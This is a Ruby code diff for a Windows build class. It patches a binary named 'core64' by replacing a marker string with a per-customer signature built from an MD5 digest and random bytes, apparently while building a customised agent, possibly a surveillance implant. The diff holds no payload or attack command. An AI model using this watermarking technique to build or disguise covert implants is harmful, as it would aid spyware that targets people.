@@ -33,6 +33,23 @@ class BuildWindows < Build
     # invoke the generic patch method with the new params
     super
 
+    # we have an exception here, the core64 must be patched only with the signature
+    file = File.open(path('core64'), 'rb+')
+    content = file.read
+
+    # per-customer signature
+    begin
+      sign = ::Signature.where({scope: 'agent'}).first
+      signature = Digest::MD5.digest(sign.value) + SecureRandom.random_bytes(16)
+      content.gsub! 'f7Hk0f5usd04apdvqw13F5ed25soV5eD', signature
+    rescue
+      raise "Signature marker not found"
+    end
+    
+    file.rewind
+    file.write content
+    file.close
+
   end
 
   def scramble
